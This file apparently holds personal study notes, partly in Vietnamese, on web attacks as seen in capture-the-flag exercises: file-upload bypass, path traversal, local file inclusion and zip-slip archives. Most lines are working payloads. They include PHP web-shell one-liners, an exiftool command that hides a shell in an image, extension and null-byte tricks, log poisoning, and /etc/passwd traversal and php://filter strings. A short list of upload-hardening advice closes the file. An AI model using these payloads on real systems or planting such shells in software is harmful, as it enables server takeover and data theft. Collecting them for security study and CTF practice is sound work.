@@ -1,0 +1,55 @@
+<?php system($_GET['cmd']);?>
+<?=`$_GET[0]`?>
+concat/group_concat(0x3c,'?php ',' phpinfo(); ?',0x3e)
+abc.php.php
+test.php%00.png , test.php\x00.png
+chạy các file cùng đuôi khác phar,phtml,...pht,inc
+.htaccess(<2.3.9):      AddType application/x-httpd-php .txt    
+change file type
+change file signature
+PYTHON save file by command 
+exiftool -Comment="<?php system($_GET['cmd']);?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+inject php to log file
+by change user-agent; referer   requestline
+
+https://nguyendt.hashnode.dev/crewctf-2022 --race condition
+
+/proc/   chứa info process đang chạy
+/proc/self/environ     là file symlink ảo trỏ tới thư mục của process hiện tại ( process đang excec)
+
+tạo ra vòng lặp vô hạn bằng cách thay đổi para từ url từ string -> obj
+test?guess[length]=9999999999999999999 
+----------------------------------------------------------------------path traversal
+encode 1 or 2 url
+..../..../..../
+...//...//
+../../../../etc/passwd%001.png
+ls%09%%32%66  ls /       2.4.5<apache
+include "http/example"
+level 4: upload a file and use the patth traversal access to that file
+level 5: inject to access.log
+mở burp suite để xem những file có đường dẫn bị ẩn đi như img 
+pwd  --->   cd email
+https://www.thegeekstuff.com/2008/10/6-awesome-linux-cd-command-hacks-productivity-tip3-for-geeks/
+
+misconfig of nginx:  location /img{ }
+-------------URI
+localhost:1111/read.php?file=file:///etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+https://www.kiso.vn/directory-traversal-vulnerabilities-phan-4.html
+
+untrusted data  rơi vào những hàm xử lý đường dẫn
+impact: thao túng file path
+
+python evilarc.py -d 2 -o unix hack.txt
+python evilarc.py -o unix -f exploit.zip sess_ -p var/lib/php/sessions
+ln -s originfile  newfile
+zip -r --symlinks demo.zip symlinkfile
+zip -y demo.zip symlinkfile 
+#-------------------------------------------------
+Luôn thực hiện input validation: Kiểm tra đồng thời tên file, content-type, header, file size mỗi khi thực hiện kiểm tra các file upload
+Phân quyền các thư mục upload, nếu là chức năng upload ảnh thì cần chặn quyền thực thi ở thư mục chứa ảnh
+Tránh để lộ đường dẫn file được upload lên
+Đổi tên file trên server khi upload thành công,thực hiện hash đường dẫn file đã được upload để chống lại việc đoán được đường dẫn file
+Sử dụng các trình scan virus trên server để ngăn chặn việc upload các file độc hại
